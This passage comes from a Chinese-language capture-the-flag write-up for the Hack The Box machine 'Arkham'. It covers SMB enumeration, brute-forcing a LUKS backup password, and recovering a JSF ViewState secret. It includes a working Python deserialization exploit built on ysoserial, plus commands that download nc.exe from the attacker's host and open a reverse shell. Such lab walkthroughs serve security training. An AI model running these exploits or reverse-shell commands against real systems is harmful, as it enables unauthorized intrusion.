C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        Users           Disk\n</code></pre> <p>\u4e5f\u53ef\u4ee5\u4f7f\u7528 smbmap \u8fdb\u884c\u626b\u63cf\uff0c\u4f46\u662f\u83b7\u53d6\u5230\u7684\u4fe1\u606f\u5e76\u6ca1\u6709\u5f88\u591a</p> <pre><code>root@kali# smbmap -H 10.10.10.130\n[+] IP: 10.10.10.130:445        Name: 10.10.10.130                                      \n        Disk                                                    Permissions\n        ----                                                    -----------\n</code></pre> <p>\u67e5\u770b Users \u5171\u4eab,BatShare \u5171\u4eab</p> <pre><code>root@kali# smbclient -N //10.10.10.130/users\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; dir\n  .                                  DR        0  Sun Feb  3 08:24:10 2019\n  ..                                 DR        0  Sun Feb  3 08:24:10 2019\n  Default                           DHR        0  Thu Jan 31 21:49:06 2019\n  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018\n  Guest                               D        0  Sun Feb  3 08:24:19 2019\nroot@kali# smbclient -N //10.10.10.130/batshare\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; dir\n  .                                   D        0  Sun Feb  3 08:00:10 2019\n  ..                                  D        0  Sun Feb  3 08:00:10 2019\n  appserver.zip                       A  4046695  Fri Feb  1 01:13:37 2019\n\n                5158399 blocks of size 4096. 2108668 blocks available\nsmb: \\&gt; get appserver.zip\ngetting file \\appserver.zip of size 4046695 as appserver.zip (1078.9 KiloBytes/sec) (average 1078.9 KiloBytes/sec)\n</code></pre> <p>Users \u4e2d\u53ea\u5b58\u653e\u4e86\u4e00\u4e9b\u9ed8\u8ba4\u7528\u6237\u548c\u8bbf\u5ba2\u7528\u6237\u7684\u6587\u4ef6\uff0c\u800c BatShare \u4e2d\u5305\u542b\u4e86\u4e00\u4e2a\u538b\u7f29\u5305appserver.zip\u540c\u65f6\u5c06\u5176\u4e0b\u8f7d\u4e0b\u6765.</p>"},{"location":"CTF/HTB/Windows-Arkham/index.html#luks-image","title":"LUKS Image","text":"<p>\u89e3\u538bzip,\u5176\u4e2d\u5305\u542b\u4e00\u4e2a\u6587\u672c\u548c\u4e00\u4e2a\u52a0\u5bc6\u7684\u78c1\u76d8\u6620\u50cf.</p> <pre><code>root@kali# unzip appserver.zip\nArchive:  appserver.zip\n  inflating: IMPORTANT.txt\n  inflating: backup.img\nroot@kali# cat IMPORTANT.txt\nAlfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce                                                                        \nroot@kali# file backup.img\nbackup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e\n</code></pre> <p>Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce                                                                        </p> <p>Alfred\uff0c\u8fd9\u662f\u6211\u4eeclinux\u670d\u52a1\u5668\u7684\u5907\u4efd\u6620\u50cf\u3002\u8bf7\u6ce8\u610f\uff0c\u5c0f\u4e11\u6216\u5176\u4ed6\u4efb\u4f55\u4eba\u90fd\u6ca1\u6709\u672a\u7ecf\u9a8c\u8bc1\u7684\u8bbf\u95ee\u6743\u9650\u3002-\u5e03\u9c81\u65af</p>"},{"location":"CTF/HTB/Windows-Arkham/index.html#luks","title":"\u66b4\u529b\u7834\u89e3 Luks \u5bc6\u7801","text":"<p>LUKS\uff08Linux \u7edf\u4e00\u5bc6\u94a5\u8bbe\u7f6e(Linux Unified Key Setup)\uff09\u662f\u4e00\u4e2a\u7528\u4e8eLinux\u7cfb\u7edf\u4e0a\u78c1\u76d8\u52a0\u5bc6\u7684\u6807\u51c6\u3002Luks\u5141\u8bb8\u7528\u6237\u5728\u786c\u76d8\u6216\u5206\u533a\u7ea7\u522b\u4e0a\u52a0\u5bc6\u6570\u636e\uff0c\u5e76\u4e14\u53ea\u6709\u5728\u63d0\u4f9b\u4e86\u6b63\u786e\u7684\u89e3\u5bc6\u5bc6\u94a5\u540e\u624d\u80fd\u8bbf\u95ee\u6570\u636e\u3002\u4f7f\u7528 bruteforce-luks \u5bf9\u5bc6\u7801\u8fdb\u884c\u7206\u7834.</p> <pre><code>root@kali# grep batman /usr/share/wordlists/rockyou.txt &gt;  test.txt\nroot@kali# apt install bruteforce-luks\nroot@kali# bruteforce-luks -t 10 -f test.txt backup.img -v 60\n...\nTried passwords: 40\nTried passwords per second: 1.333333\nLast tried password: batman27\n\nTried passwords: 60\nTried passwords per second: 1.395349\nLast tried password: batman82\n\nPassword found: batmanforever\n</code></pre> <p>-t 10   \u4f7f\u7528 10 \u4e2a\u7ebf\u7a0b</p> <p>-f test.txt  \u8981\u5c1d\u8bd5\u7684\u5bc6\u7801\u5217\u8868</p> <p>-v 60  \u6bcf 60 \u79d2\u6253\u5370\u4e00\u6b21\u8fdb\u5ea6</p> <p>\u6210\u529f\u8dd1\u51fa\u5bc6\u7801\u4e3a\uff1abatmanforver</p>"},{"location":"CTF/HTB/Windows-Arkham/index.html#mount","title":"Mount","text":"<p>\u4f7f\u7528 cryptsetup \u6253\u5f00\u6587\u4ef6</p> <p>Cryptsetup \u662f\u4e00\u4e2a\u7528\u4e8e\u7ba1\u7406 Linux \u7cfb\u7edf\u4e0a\u52a0\u5bc6\u8bbe\u5907\u7684\u547d\u4ee4\u884c\u5de5\u5177\u3002\u5b83\u662f\u57fa\u4e8e Device Mapper\uff08\u8bbe\u5907\u6620\u5c04\uff09\u6280\u672f\u7684\uff0c\u80fd\u591f\u4e0e LUKS\uff08Linux Unified Key Setup\uff09\u5377\u3001TrueCrypt \u548c dm-crypt \u7b49\u52a0\u5bc6\u6280\u672f\u8fdb\u884c\u4ea4\u4e92\u3002</p> <pre><code>root@kali# cryptsetup open --type luks backup.img arkham\nEnter passphrase for backup.img:\n</code></pre> <p>\u5b8c\u6210\u540e\uff0c\u5c4f\u5e55\u4e0a\u4e0d\u4f1a\u663e\u793a\u4efb\u4f55\u5185\u5bb9\uff0c\u4f46\u6709\u4e00\u4e2a\u65b0\u8bbe\u5907\u53ef\u7528\uff0c\u67e5\u770b\u9a71\u52a8\u53d1\u73b0\u4e00\u4e2a\u65b0\u8bbe\u5907</p> <pre><code>root@kali# ls -l /dev/mapper/\ntotal 0\nlrwxrwxrwx 1 root root       7 Aug  5 02:11 arkham -&gt; ../dm-0\ncrw------- 1 root root 10, 236 Aug  5 02:11 control\n</code></pre> <p>\u6302\u8f7d\u65b0\u8bbe\u5907\u5230 arkham \u76ee\u5f55\u4e0b</p> <pre><code>root@kali# mount /dev/mapper/arkham /mnt/arkham/\nroot@kali# ls /mnt/arkham/\nlost+found  Mask\n</code></pre>"},{"location":"CTF/HTB/Windows-Arkham/index.html#_2","title":"\u6587\u4ef6\u679a\u4e3e","text":"<pre><code>root@kali# find /mnt/arkham/ -type f\n/mnt/arkham/Mask/robin.jpeg\n/mnt/arkham/Mask/docs/Batman-Begins.pdf\n/mnt/arkham/Mask/me.jpg\n/mnt/arkham/Mask/joker.png\n/mnt/arkham/Mask/tomcat-stuff/web.xml.bak\n/mnt/arkham/Mask/tomcat-stuff/web.xml\n/mnt/arkham/Mask/tomcat-stuff/server.xml\n/mnt/arkham/Mask/tomcat-stuff/tomcat-users.xml\n/mnt/arkham/Mask/tomcat-stuff/jaspic-providers.xml\n/mnt/arkham/Mask/tomcat-stuff/context.xml\n/mnt/arkham/Mask/tomcat-stuff/faces-config.xml\n/mnt/arkham/Mask/tomcat-stuff/MANIFEST.MF\n/mnt/arkham/Mask/mycar.jpg\n</code></pre> <p>\u5176\u4e2d\u5305\u62ec\u8759\u8760\u4fa0\u7684\u56fe\u7247\u548c tomcat-stuff \u6587\u4ef6\u5939\uff0c\u901a\u8fc7\u5bf9\u5176\u4e2d\u5404\u4e2a\u6587\u4ef6\u7684\u7b5b\u67e5\uff0c\u6211\u4eec\u5728 web.xml.bak \u4e2d\u53d1\u73b0\u4e86\u6709\u8da3\u7684\u4e1c\u897f\u3002</p> <p></p> <pre><code> 1 &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n ...\n 14 &lt;servlet&gt;\n 15 &lt;servlet-name&gt;Faces Servlet&lt;/servlet-name&gt;\n 16 &lt;servlet-class&gt;javax.faces.webapp.FacesServlet&lt;/servlet-class&gt;\n 17 &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;\n 18 &lt;/servlet&gt;\n 19 &lt;servlet-mapping&gt;\n 20 &lt;servlet-name&gt;Faces Servlet&lt;/servlet-name&gt;\n 21 &lt;url-pattern&gt;*.faces&lt;/url-pattern&gt;\n 22 &lt;/servlet-mapping&gt;\n 23 &lt;context-param&gt;\n 24 &lt;param-name&gt;javax.servlet.jsp.jstl.fmt.localizationContext&lt;/param-name&gt;\n 25 &lt;param-value&gt;resources.application&lt;/param-value&gt;\n 26 &lt;/context-param&gt;\n 27 &lt;context-param&gt;\n 28 &lt;description&gt;State saving method: 'client' or 'server' (=default). See JSF Specification 2.5.2&lt;/description&gt;\n 29 &lt;param-name&gt;javax.faces.STATE_SAVING_METHOD&lt;/param-name&gt;\n 30 &lt;param-value&gt;server&lt;/param-value&gt;\n 31 &lt;/context-param&gt;\n 32 &lt;context-param&gt;\n 33 &lt;param-name&gt;org.apache.myfaces.SECRET&lt;/param-name&gt;\n 34 &lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;\n 35 &lt;/context-param&gt;\n 36     &lt;context-param&gt;\n 37         &lt;param-name&gt;org.apache.myfaces.MAC_ALGORITHM&lt;/param-name&gt;\n 38         &lt;param-value&gt;HmacSHA1&lt;/param-value&gt;\n 39      &lt;/context-param&gt;\n 40 &lt;context-param&gt;\n 41 &lt;param-name&gt;org.apache.myfaces.MAC_SECRET&lt;/param-name&gt;\n 42 &lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;\n 43 &lt;/context-param&gt;\n ...\n</code></pre> <p>\u6839\u636e\u4ee5\u4e0a\u914d\u7f6e\u6587\u4ef6\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u4ee5\u4e0b\u4fe1\u606f</p> <ul> <li>JSF \u7248\u672c\u4e3a 2.5.2</li> <li>\u8be5\u7ad9\u70b9\u4f1a\u5339\u914d *.faces \u6765\u8c03\u7528 servlet</li> <li>myfaces \u7684 SECRET \u4e3a SnNGOTg3Ni0=\uff0cHmacSHA1 \u7684 SECRET \u4e3a SnNGOTg3Ni0=\uff0cSnNGOTg3Ni0= \u7ecf\u8fc7\u89e3\u7801\u540e\u4e3a JsF9876-</li> </ul>"},{"location":"CTF/HTB/Windows-Arkham/index.html#_3","title":"\u6f0f\u6d1e\u5229\u7528\u4e0e\u68c0\u6d4b","text":""},{"location":"CTF/HTB/Windows-Arkham/index.html#jsf-viewstate","title":"JSF ViewState\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","text":"<p>JSF \u6846\u67b6\u4e3b\u8981\u4f7f\u7528\u5e8f\u5217\u5316\u6765\u4fdd\u6301\u7ad9\u70b9\u7684\u72b6\u6001\uff0c\u5b83\u4f1a\u5e2e\u52a9\u670d\u52a1\u5668\u5e8f\u5217\u5316\u4e00\u4e2a Java \u5bf9\u8c61\uff0c\u5e76\u5c06\u5176\u4f5c\u4e3a\u7f51\u9875\u4e2d\u7684\u9690\u85cf\u5b57\u6bb5\u53d1\u9001\u5230\u5ba2\u6237\u7aef\uff0c\u5f53\u5ba2\u6237\u7aef\u63d0\u4ea4\u65f6\u8be5\u5e8f\u5217\u5316\u5bf9\u8c61\u88ab\u53d1\u9001\u56de\u670d\u52a1\u5668\uff0c\u670d\u52a1\u5668\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u53d6\u56de\u72b6\u6001\u3002\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u662f\u5141\u8bb8\u7528\u6237\u63d0\u4ea4\u5e8f\u5217\u5316\u5bf9\u8c61\uff0c\u5982\u679c\u5e8f\u5217\u5316\u5bf9\u8c61\u5305\u542b\u6076\u610f\u4ee3\u7801\uff0c\u90a3\u4e48\u5728\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\u5c31\u4f1a\u8fd0\u884c\u3002\u4ece\u800c\u7528\u6237\u53ef\u4ee5\u63a7\u5236\u8f93\u5165\u6765\u83b7\u53d6\u6267\u884c\u6743\u9650\u3002</p> <p>\u5982\u4f55\u9a8c\u8bc1\u662f\u5426\u5b58\u5728ViewState\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff1f</p> <p>1\u3001\u6d4b\u8bd5\u63d0\u4ea4\u9519\u8bef\u7684 ViewState \u4f1a\u53d1\u751f\u4ec0\u4e48\uff1f 2\u3001\u89e3\u5bc6 ViewState \u53d8\u91cf\u6765\u663e\u793a\u6211\u7684\u52a0\u5bc6\u5bc6\u94a5\u6709\u6548 3\u3001\u6784\u5efa\u811a\u672c\u52a0\u5bc6\u597d\u7684 ViewState \u5e76\u8fdb\u884c\u63d0\u4ea4 4\u3001\u4f7f\u7528 ysoserial \u6765\u751f\u6210 payload\uff0c\u5b83\u53ef\u4ee5\u4f7f\u7528\u811a\u672c\u4e2d\u7684 ViewState \u6765 ping \u4e3b\u673a 5\u3001\u66f4\u65b0 payload \u83b7\u53d6\u53cd\u5f39shell</p> <p>\u627e\u5230\u4e4b\u524d\u7684\u8ba2\u9605\u680f\u76ee\uff0c\u4f7f\u7528 BurpSuite \u5c06\u6570\u636e\u5305\u62e6\u622a\uff0c\u5177\u4f53\u6570\u636e\u5305\u5982\u4e0b</p> <pre><code>POST /userSubscribe.faces HTTP/1.1\nHost: 10.10.10.130:8080\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://10.10.10.130:8080/userSubscribe.faces\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 261\nCookie: JSESSIONID=D8A54B3871DBBA43CBCBA95A59D6F643\nConnection: close\nUpgrade-Insecure-Requests: 1\n\nj_id_jsp_1623871077_1%3Aemail=0xdf&amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&amp;j_id_jsp_1623871077_1_SUBMIT=1&amp;\njavax.faces.ViewState=wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RXtNO1NI%2FGme70KtDtngjDm0mNzA9qHjYerxo\n0jW7zu1DWIHlJqY3Fedt5UA7dKm1%2FZ7jZk%3D\n</code></pre> <p>\u5c06 javax.faces.ViewState \u53c2\u6570\u7684\u503c\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4ece w \u5b57\u7b26\u4fee\u6539\u4e3a W \u5b57\u7b26\uff0c\u67e5\u770b\u9875\u9762\u62a5\u9519\u4fe1\u606f</p> <p></p>"},{"location":"CTF/HTB/Windows-Arkham/index.html#viewstate","title":"ViewState\u89e3\u7801","text":"<p>\u6211\u4eec\u53ef\u4ee5\u6293\u53d6\u5230 javax.faces.ViewState \u53c2\u6570\u7684\u503c\u5982\u4e0b</p> <pre><code>javax.faces.ViewState=wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0j\nW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D\n</code></pre> <p>\u901a\u8fc7 python \u4ee3\u7801\u6765\u83b7\u53d6\u5176\u4e2d\u7684\u5b57\u8282\u6d41</p> <pre><code>from base64 import b64decode\nfrom urllib.parse import unquote_plus as urldecode\n\nvs = 'wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D'\nvs_urldecode = urldecode(vs)\nprint(vs_urldecode)\nvs_bs64decode = b64decode(vs_urldecode)\nprint(vs_bs64decode)\n</code></pre> <p></p> <p>\u8fd9\u662f\u52a0\u5bc6\u7684\u5b57\u8282\u6d41\uff0c\u6211\u4eec\u9700\u8981\u901a\u8fc7\u89e3\u5bc6\u6765\u83b7\u53d6\u5176\u4e2d\u7684\u4fe1\u606f\u3002SHA1\u7684\u957f\u5ea6\u901a\u5e38\u4e3a20\u5b57\u8282\uff0c\u5f88\u53ef\u80fd\u9644\u52a0\u5230\u9996\u4f4d\u6216\u672b\u5c3e\u3002\u7ecf\u8fc7\u6d4b\u8bd5 HMAC \u5b58\u50a8\u5728\u6700\u540e20\u5b57\u8282\u4e2d</p> <pre><code>from base64 import b64decode\nfrom urllib.parse import unquote_plus as urldecode\nfrom hashlib import sha1  # \u5bfc\u5165 hashlib \u6a21\u5757\u4e2d\u7684 sha1 \u54c8\u5e0c\u51fd\u6570\nimport hmac  # \u5bfc\u5165 hmac \u6a21\u5757\uff0c\u7528\u4e8e\u8ba1\u7b97 HMAC\n\nvs = 'wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D'\nvs_urldecode = urldecode(vs)  # \u5bf9\u5b57\u7b26\u4e32\u8fdb\u884c URL \u89e3\u7801\nvs_bs64decode = b64decode(vs_urldecode)  # \u5bf9 URL \u89e3\u7801\u540e\u7684\u5b57\u7b26\u4e32\u8fdb\u884c Base64 \u89e3\u7801\nmac = vs_bs64decode[-20:]  # \u83b7\u53d6\u6570\u636e\u7684 MAC\uff08\u6d88\u606f\u9a8c\u8bc1\u7801\uff09\nenc = vs_bs64decode[:-20]  # \u83b7\u53d6\u6570\u636e\u7684\u5185\u5bb9\nenc_hmac = hmac.new(b'JsF9876-', enc, sha1).digest()  # \u8ba1\u7b97\u6570\u636e\u5185\u5bb9\u7684 HMAC\uff08\u57fa\u4e8e\u54c8\u5e0c\u7684\u6d88\u606f\u8ba4\u8bc1\u7801\uff09\nprint(mac)  # \u8f93\u51fa\u6570\u636e\u7684 MAC\uff08\u6d88\u606f\u9a8c\u8bc1\u7801\uff09\nprint(enc_hmac)  # \u8f93\u51fa\u8ba1\u7b97\u5f97\u5230\u7684\u6570\u636e\u5185\u5bb9\u7684 HMAC\n</code></pre> <p></p> <p>\u76ee\u524d\u5df2\u77e5\u52a0\u5bc6\u65b9\u5f0f\u3001\u52a0\u5bc6\u4f4d\u7f6e\u4ee5\u53ca\u5bc6\u94a5\uff0c\u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u89e3\u5bc6\u8fd9\u4e32\u503c</p> <pre><code>from base64 import b64decode\nfrom urllib.parse import unquote_plus as urldecode\nfrom Crypto.Cipher import DES  # \u5bfc\u5165 Crypto.Cipher \u6a21\u5757\u4e2d\u7684 DES \u52a0\u5bc6\u7b97\u6cd5\n\nvs = 'wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D'\nvs_urldecode = urldecode(vs)\nvs_bs64decode = b64decode(vs_urldecode)\nenc = vs_bs64decode[:-20]   # \u83b7\u53d6\u6570\u636e\u7684\u5bc6\u6587\uff08\u9664\u4e86\u6700\u540e 20 \u4e2a\u5b57\u8282\u4e4b\u5916\u7684\u90e8\u5206\uff09\nd = DES.new(b'JsF9876-', DES.MODE_ECB)  # \u4f7f\u7528 DES \u7b97\u6cd5\u548c ECB \u6a21\u5f0f\u521b\u5efa\u4e00\u4e2a DES \u5bf9\u8c61\uff0c\u7528\u4e8e\u89e3\u5bc6\nprint(d.decrypt(enc))\n</code></pre> <p></p> <p>\u7ecf\u8fc7\u89e3\u5bc6\u540e\u51fa\u73b0\u5b57\u7b26\u4e32\u8bf4\u660e\u89e3\u5bc6\u786e\u5b9e\u662f\u6b63\u786e\u7684.</p>"},{"location":"CTF/HTB/Windows-Arkham/index.html#ysoserial","title":"ysoserial","text":"<p>ysoserial\u662f\u4e00\u4e2a\u7528\u4e8e\u751f\u6210java\u53cd\u5e8f\u5217\u5316\u6709\u6548\u8d1f\u8f7d\u7684\u9879\u76ee\u3002\u6700\u65e9\u57282015\u5e74Marshalling Pickles: how deserializing objects will destroy your\u4f1a\u8bae\u4e0a\u63d0\u51fa\u7684\u4e00\u4e2a\u5de5\u5177\uff0c\u8be5\u5de5\u5177\u5305\u542b\u5404\u79cdjava\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\uff0c\u53ef\u76f4\u63a5\u751f\u6210\u5e8f\u5217\u5316\u6570\u636e\u6587\u4ef6\uff0c\u4e5f\u53ef\u901a\u8fc7\u4ea4\u4e92\u5f0f\u5f00\u542f\u5404\u79cd\u670d\u52a1\u3002\u603b\u4e4b\uff0c\u63d0\u5230java\u53cd\u5e8f\u5217\u5316\u4e00\u5b9a\u4f1a\u6709ysoserial\u5de5\u5177\u7684\u51fa\u73b0\uff0c\u901a\u8fc7\u8be5\u5de5\u5177\u76f4\u63a5\u5feb\u901f\u751f\u6210java\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u6709\u6548\u8d1f\u8f7d.</p> <p>\u4e0b\u8f7d\u94fe\u63a5\uff1ahttps://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar</p> <p>\u4f7f\u7528 ysoserial \u6765\u751f\u6210 ping \u547d\u4ee4\u7684 payload\u3002</p> <pre><code>java -jar ./ysoserial.jar BeanShell1 'ping 10.10.14.14' &gt; text\n</code></pre> <p></p> <p>\u751f\u6210\u6210\u529f\uff0c\u4f46\u662f\u6211\u9700\u8981\u5c06\u5176\u653e\u5165 python \u811a\u672c\u5f53\u4e2d\u8fdb\u884c\u8c03\u7528.</p> <p>\u5b89\u88c5\u6a21\u5757 pip install pycryptodome.</p> <pre><code>import requests\nimport subprocess\nimport sys\nfrom base64 import b64encode\nfrom Crypto.Cipher import DES\nfrom Crypto.Hash import SHA, HMAC\nfrom os import devnull\nfrom urllib.parse import quote_plus as urlencode\n\n\nwith open(devnull, 'w') as null:\n    payload = subprocess.check_output(['java', '-jar', '/root/hackthebox/Machines/Arkham/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar', sys.argv[1], sys.argv[2]], stderr=null)\n\npad = (8 - (len(payload) % 8)) % 8\npadded = payload + (chr(pad)*pad).encode()\n\nd = DES.new(b'JsF9876-', DES.MODE_ECB)\nenc_payload = d.encrypt(padded)\nsig = HMAC.new(b'JsF9876-', enc_payload, SHA).digest()\nviewstate = b64encode(enc_payload + sig)\n\nsess = requests.session()\nsess.get('http://10.10.10.130:8080/userSubscribe.faces')\nresp = sess.post('http://10.10.10.130:8080/userSubscribe.faces',\n        data = {'j_id_jsp_1623871077_1%3Aemail': 'd',\n                'j_id_jsp_1623871077_1%3Asubmit': 'SIGN+UP',\n                'j_id_jsp_1623871077_1_SUBMIT': '1',\n                'javax.faces.ViewState': viewstate})\n</code></pre> <p>\u542f\u52a8\u672c\u5730\u76d1\u542c</p> <pre><code>tcpdump -i tun0 icmp\n</code></pre> <p>\u4f7f\u7528\u811a\u672c\u6267\u884c ping \u547d\u4ee4</p> <pre><code>python3 exploit.py BeanShell1 'ping 10.10.14.14'\n</code></pre> <pre><code>root@kali# tcpdump -i tun0 icmp\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on tun0, link-type RAW (Raw IP), capture size 262144 bytes\n16:27:33.898247 IP 10.10.10.130 &gt; kali: ICMP echo request, id 1, seq 1, length 40\n16:27:33.898266 IP kali &gt; 10.10.10.130: ICMP echo reply, id 1, seq 1, length 40\n16:27:34.910181 IP 10.10.10.130 &gt; kali: ICMP echo request, id 1, seq 2, length 40\n16:27:34.910199 IP kali &gt; 10.10.10.130: ICMP echo reply, id 1, seq 2, length 40\n16:27:35.925949 IP 10.10.10.130 &gt; kali: ICMP echo request, id 1, seq 3, length 40\n16:27:35.925964 IP kali &gt; 10.10.10.130: ICMP echo reply, id 1, seq 3, length 40\n16:27:36.938872 IP 10.10.10.130 &gt; kali: ICMP echo request, id 1, seq 4, length 40\n16:27:36.938903 IP kali &gt; 10.10.10.130: ICMP echo reply, id 1, seq 4, length 40\n</code></pre> <p>\u6210\u529f\u6536\u5230 ping \u547d\u4ee4\uff0c\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u9a8c\u8bc1\u6210\u529f</p>"},{"location":"CTF/HTB/Windows-Arkham/index.html#shell","title":"\u83b7\u53d6shell","text":"<p>\u4e3a\u4e86\u83b7\u53d6\u76ee\u6807\u7ad9\u70b9\u7684shell\uff0c\u6211\u4eec\u628a nc64.exe \u653e\u5728\u672c\u76ee\u5f55\u4e0b\u5e76\u5f00\u542f http \u670d\u52a1</p> <pre><code>python -m SimpleHTTPServer 80\n</code></pre> <p>\u5728\u672c\u5730\u5f00\u542f\u76d1\u542c\uff0c\u63a5\u6536\u53cd\u5f39shell</p> <pre><code> nc -nvlp 443\n</code></pre> <p>\u8fd9\u91cc\u9700\u8981\u5728 exploit.py \u8fdb\u884c\u7565\u5fae\u4fee\u6539\uff0c\u6e90\u7801\u5982\u4e0b</p> <pre><code>#!/usr/bin/env python3\n\nimport requests\nimport subprocess\nimport sys\nfrom base64 import b64encode\nfrom Crypto.Cipher import DES\nfrom Crypto.Hash import SHA, HMAC\nfrom os import devnull\nfrom urllib.parse import quote_plus as urlencode\n\n\nwith open(devnull, 'w') as null:\n    payload = subprocess.check_output(['java', '-jar', '/root/hackthebox/Machines/Arkham/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar', 'CommonsCollections5', sys.argv[1]], stderr=null)\n\npad = (8 - (len(payload) % 8)) % 8\npadded = payload + (chr(pad)*pad).encode()\n\nd = DES.new(b'JsF9876-', DES.MODE_ECB)\nenc_payload = d.encrypt(padded)\nsig = HMAC.new(b'JsF9876-', enc_payload, SHA).digest()\nviewstate = b64encode(enc_payload + sig)\n\nsess = requests.session()\nsess.get('http://10.10.10.130:8080/userSubscribe.faces')\nresp = sess.post('http://10.10.10.130:8080/userSubscribe.faces',\n        data = {'j_id_jsp_1623871077_1%3Aemail': 'd',\n                'j_id_jsp_1623871077_1%3Asubmit': 'SIGN+UP',\n                'j_id_jsp_1623871077_1_SUBMIT': '1',\n                'javax.faces.ViewState': viewstate})\n</code></pre> <p>\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u4e0a\u4f20 nc \u5e76\u4f7f\u7528 nc \u8fde\u63a5\u672c\u5730443\u7aef\u53e3</p> <pre><code>python3 exploit2.py \"powershell -c Invoke-Webrequest -uri 'http://10.10.14.14/nc64.exe' -outfile \\windows\\system32\\spool\\drivers\\color\\nc.exe\"\npython3 exploit2.py \"\\windows\\system32\\spool\\drivers\\color\\nc.exe -e cmd 10.10.14.14 443\"\n</code></pre> <pre><code>root@kali# nc -lnvp 443\nNcat: Version 7.70 ( https://nmap.org/ncat )\nNcat: Listening on :::443\nNcat: Listening on 0.0.0.0:443\nNcat: Connection from 10.10.10.130.\nNcat: Connection from 10.10.10.130:49720.\nMicrosoft Windows [Version 10.0.17763.107]\n(c) 2018 Microsoft Corporation. All rights reserved.\n</code></pre> <p>\u6210\u529f\u6536\u5230\u53cd\u5f39shell\uff0c\u5728\u5f53\u524d\u7528\u6237\u7684\u684c\u9762\u4e0a\u627e\u5230\u7b2c\u4e00\u4e2aflag.</p>"},{"location":"CTF/HTB/Windows-Arkham/index.html#_4","title":"\u6743\u9650\u63d0\u5347","text":""},{"location":"CTF/HTB/Windows-Arkham/index.html#_5","title":"\u83b7\u5f97\u5bc6\u7801","text":"<p>\u5728\u4e3b\u76ee\u5f55\u4e0b\u679a\u4e3e\u5173\u952e\u6587\u4ef6</p> <pre><code>C:\\&gt;dir /s /b /a:-d-h \\Users\\alfred | findstr /i /v \"appdata\"\ndir /s /b /a:-d-h \\Users\\alfred | findstr /i /v \"appdata\"\nC:\\Users\\alfred\\Desktop\\user.txt\nC:\\Users\\alfred\\Documents\\tomcat.bat\nC:\\Users\\alfred\\Downloads\\backups\\backup.zip\nC:\\Users\\alfred\\Favorites\\Bing.url\nC:\\Users\\alfred\\Links\\Desktop.lnk\nC:\\Users\\alfred\\Links\\Downloads.lnk\n</code></pre> <p>dir: \u8fd9\u4e2a\u547d\u4ee4\u7528\u4e8e\u5217\u51fa\u6307\u5b9a\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u548c\u5b50\u76ee\u5f55\u3002</p> <p>/s: \u8fd9\u4e2a\u9009\u9879\u544a\u8bc9 dir \u547d\u4ee4\u9012\u5f52\u5730\u641c\u7d22\u5b50\u76ee\u5f55\u3002</p> <p>/b: \u8fd9\u4e2a\u9009\u9879\u544a\u8bc9 dir \u547d\u4ee4\u53ea\u8f93\u51fa\u6587\u4ef6\u540d\u6216\u76ee\u5f55\u540d\uff0c\u4e0d\u663e\u793a\u4efb\u4f55\u5176\u4ed6\u4fe1\u606f\u3002</p> <p>/a:-d-h: \u8fd9\u4e2a\u9009\u9879\u544a\u8bc9 dir \u547d\u4ee4\u53ea\u5217\u51fa\u975e\u9690\u85cf\u7684\u6587\u4ef6\u548c\u975e\u9690\u85cf\u7684\u76ee\u5f55\u3002-d \u8868\u793a\u4ec5\u5217\u51fa\u76ee\u5f55\uff0c-h \u8868\u793a\u4ec5\u5217\u51fa\u975e\u9690\u85cf\u7684\u6587\u4ef6\u3002</p> <p>\\Users\\alfred: 